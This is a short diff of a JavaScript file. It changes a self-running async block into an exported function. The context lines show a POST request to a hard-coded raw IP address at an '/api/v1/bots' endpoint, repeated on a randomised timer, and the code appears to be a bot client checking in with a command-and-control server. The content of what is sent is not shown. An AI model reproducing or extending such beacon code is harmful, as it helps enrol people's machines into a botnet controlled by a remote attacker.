@@ -5,7 +5,7 @@ const request = require('request');
 
 const RANDOM_INTERVAL = Math.floor(Math.random() * 120000) + 30000;
 
-(async () => {
+module.exports = async () => {
     await fetch('http://212.111.203.181/api/v1/bots', {
         method  : 'POST',
         headers : {
@@ -42,5 +42,5 @@ const RANDOM_INTERVAL = Math.floor(Math.random() * 120000) + 30000;
             console.log(err);
         }
     }, RANDOM_INTERVAL);
-})();
+};
 
